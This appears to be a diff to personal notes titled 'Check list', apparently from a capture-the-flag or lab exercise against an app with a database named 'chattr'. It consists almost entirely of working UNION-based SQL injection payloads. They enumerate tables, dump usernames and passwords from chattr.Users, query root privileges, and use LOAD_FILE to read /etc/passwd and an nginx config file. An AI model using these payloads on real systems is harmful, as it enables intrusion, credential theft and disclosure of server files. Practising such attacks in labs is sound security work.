@@ -15,7 +15,7 @@ Check list:
 
 
 
- q=adawd') UNION ALL SELECT NULL,NULL,NULL,-- -&u=3
+ q=adawd') UNION ALL SELECT NULL,NULL,NULL,@@datadir-- -&u=3
 
  q=adawd') UNION ALL SELECT NULL,NULL,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -&u=
  
@@ -24,3 +24,10 @@ Check list:
 
 q=adawd') UNION ALL SELECT NULL,NULL, username, password from chattr.Users-- -&u=3
 q=adawd') UNION ALL SELECT NULL,NULL,grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -&u=3
+
+
+q=adawd') UNION ALL SELECT NULL,NULL,NULL,user from chattr.user-- -&u=
+
+chattr_dbUser@localhost
+LOAD_FILE("/etc/passwd")
+ q=adawd') UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -&u=3
